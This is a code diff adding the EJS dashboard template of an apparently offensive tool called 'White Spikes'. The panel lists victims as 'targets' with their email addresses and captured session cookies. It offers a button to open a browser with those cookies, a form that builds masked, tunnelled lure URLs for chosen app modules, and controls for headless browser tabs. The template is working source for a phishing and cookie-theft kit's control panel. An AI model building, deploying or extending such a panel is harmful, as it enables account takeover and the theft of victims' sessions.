@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard | WHITE SPIKES</title>
+    <link rel="stylesheet" href="/assets/css/main.css">
+    <link rel="stylesheet" href="/assets/css/dashboard.css">
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.4/socket.io.js"
+        integrity="sha512-tE1z+95+lMCGwy+9PnKgUSIeHhvioC9lMlI7rLWU0Ps3XTdjRygLcy4mLuL0JAoK4TLdQEyP0yOl/9dMOqpH/Q=="
+        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.6.5/axios.min.js"
+        integrity="sha512-TjBzDQIDnc6pWyeM1bhMnDxtWH0QpOXMcVooglXrali/Tj7W569/wd4E8EDjk1CwOAOPSJon1VfcEt1BI4xIrA=="
+        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+    <script src="/assets/js/main.js" defer></script>
+    <script src="/assets/js/dashboard.js" defer></script>
+</head>
+
+<body>
+    <div class="main-container">
+        <div class="main-header">
+            <div class="left">
+                <a href="https://madhanmaaz.netlify.app" target="_blank" rel="noopener noreferrer">
+                    <h2><b>@</b>White<span>Spikes</span></h2>
+                    <h6>- Created by Madhan</h6>
+                </a>
+            </div>
+
+            <div class="right">
+                <a id="creator-btn">
+                    <button class="b-btn" title="Create">
+                        <i class="fa-solid fa-plus"></i>
+                    </button>
+                </a>
+
+                <a id="setting-btn">
+                    <button class="b-btn" title="Settings">
+                        <i class="fa-solid fa-gear"></i>
+                    </button>
+                </a>
+
+                <a id="upload-cookie">
+                    <button class="b-btn" title="Open Browser with cookies">
+                        <i class="fa-brands fa-chrome"></i>
+                    </button>
+                </a>
+
+                <a id="information-btn">
+                    <button class="b-btn" title="info">
+                        <i class="fa-solid fa-circle-info"></i>
+                    </button>
+                </a>
+
+                <a href="/logout">
+                    <button class="b-btn" title="Logout">
+                        <i class="fa-solid fa-arrow-right-from-bracket"></i>
+                    </button>
+                </a>
+            </div>
+        </div>
+
+        <div class="main-content">
+            <div class="targets-header">
+                <div class="left">
+                    <h3>targets <sup><%- data.length %></sup></h3>
+                </div>
+
+                <div class="right">
+                    <button class="b-btn" title="delete all targets" id="delete-all-targets">
+                        <i class="fa-solid fa-trash-can"></i>
+                    </button>
+                </div>
+            </div>
+
+            <div class="targets-content">
+                <% for(let obj of data){ %>
+                    <div class="target <%- obj.cookies %>">
+                        <div class="left">
+                            <pre><b>ID & APP</b> : <%- obj.id %> | <%- obj.appName %></pre>
+                            <pre><b>EMAIL</b>    : <%- obj.email %></pre>
+                            <pre id="tar-<%- obj.id %>-cookies"><b>COOKIES</b>  : <%- obj.cookies %></pre>
+                        </div>
+
+                        <div class="right">
+                            <button data-id="<%- obj.id %>" id="panel-btn" class="b-btn" title="goto panel">
+                                <i class="fa-solid fa-terminal"></i>
+                            </button>
+                            <button data-id="<%- obj.id %>" id="delete-btn" class="b-btn" title="delete target">
+                                <i class="fa-solid fa-trash"></i>
+                            </button>
+                        </div>
+                    </div>
+                    <% } %>
+            </div>
+        </div>
+    </div>
+
+    <section class="dialog creator-container">
+        <div class="head">
+            <h3>Creator</h3>
+
+            <div class="left">
+                <button class="b-btn">
+                    <i class="fa-solid fa-xmark"></i>
+                </button>
+            </div>
+        </div>
+
+        <form class="content">
+            <div class="box-inp">
+                <label>server</label>
+                <select name="server" required>
+                    <option value="" selected disabled>None</option>
+                    <option value="self">self</option>
+                    <option value="tunnel">tunnel</option>
+                </select>
+            </div>
+
+            <div class="box-inp">
+                <label>APP</label>
+                <select name="appName" required>
+                    <option value="" selected disabled>None</option>
+                    <% for(let spikeModule in spikeModules) { %>
+                        <option value="<%- spikeModule %>"><%- spikeModule %></option>
+                        <% } %>
+                </select>
+            </div>
+
+            <div class="box-inp">
+                <label>iframe</label>
+                <select name="iframe">
+                    <option value="yes">yes</option>
+                    <option value="no">no</option>
+                </select>
+            </div>
+
+            <div class="box-inp">
+                <label>email</label>
+                <input type="text" placeholder="any@any.com | username | ph" name="email">
+            </div>
+
+            <div class="box-inp">
+                <label>mask</label>
+                <input type="text" placeholder="example.com" name="mask">
+            </div>
+
+            <div class="box-inp" style="width: 100%;">
+                <label>url preview</label>
+                <textarea placeholder="url..." id="preview-url" readonly></textarea>
+            </div>
+
+            <input class="b-btn create-btn" type="submit" value="Create">
+
+            <p class="app-description">[appName]-(description)</p>
+        </form>
+    </section>
+
+    <!-- ------------------------- -->
+    <section class="dialog settings-container">
+        <div class="head">
+            <h3>Settings</h3>
+            <div class="right">
+                <button class="b-btn">
+                    <i class="fa-solid fa-xmark"></i>
+                </button>
+            </div>
+        </div>
+
+        <div class="content">
+            <h4 class="sub">admin credentials</h4>
+            <form id="credentials-config">
+                <div class="box-inp">
+                    <label>username</label>
+                    <input type="text" required value="<%- adminConfig.username %>" name="username">
+                </div>
+                <div class="box-inp">
+                    <label>old password</label>
+                    <input type="password" required name="oldpassword">
+                </div>
+                <div class="box-inp">
+                    <label>new password</label>
+                    <input type="password" required name="newpassword">
+                </div>
+                <button class="b-btn" title="set config">
+                    <i class="fa-solid fa-check"></i>
+                </button>
+            </form>
+
+            <h4 class="sub">headless</h4>
+            <pre>Close all headless tabs: <button class="b-btn" id="close-all-tabs"><i class="fa-solid fa-rectangle-xmark"></i></button></pre>
+        </div>
+    </section>
+
+    <section class="dialog information-container">
+        <div class="head">
+            <h3>Info</h3>
+            <div class="right">
+                <button class="b-btn">
+                    <i class="fa-solid fa-xmark"></i>
+                </button>
+            </div>
+        </div>
+
+        <div class="content">
+            <table>
+                <% for(let sub in appInformation) { %>
+                    <tr>
+                        <th>
+                            <h4 class="sub"><%- sub %></h4>
+                        </th>
+                    </tr>
+                    <% for(let key in appInformation[sub]) { %>
+                        <tr>
+                            <th><%- key %></th>
+                            <td>:</td>
+                            <td><%- appInformation[sub][key] %></td>
+                        </tr>
+                        <% } %>
+
+                            <% } %>
+            </table>
+
+            <div class="con">
+                <h4 class="sub">Contact.</h4>
+
+                <a href="https://madhanmaaz.netlify.app/" class="b-btn">
+                    <i class="fa-solid fa-window-maximize"></i>
+                </a>
+
+                <a href="https://instagram.com/madhanmaaz" class="b-btn">
+                    <i class="fa-brands fa-instagram"></i>
+                </a>
+
+                <a href="https://www.linkedin.com/in/madhan-s-4418b5255/" class="b-btn">
+                    <i class="fa-brands fa-linkedin"></i>
+                </a>
+
+                <a href="https://twitter.com/madhanthehacker" class="b-btn">
+                    <i class="fa-brands fa-x-twitter"></i>
+                </a>
+            </div>
+        </div>
+
+    </section>
+</body>
+
+</html>
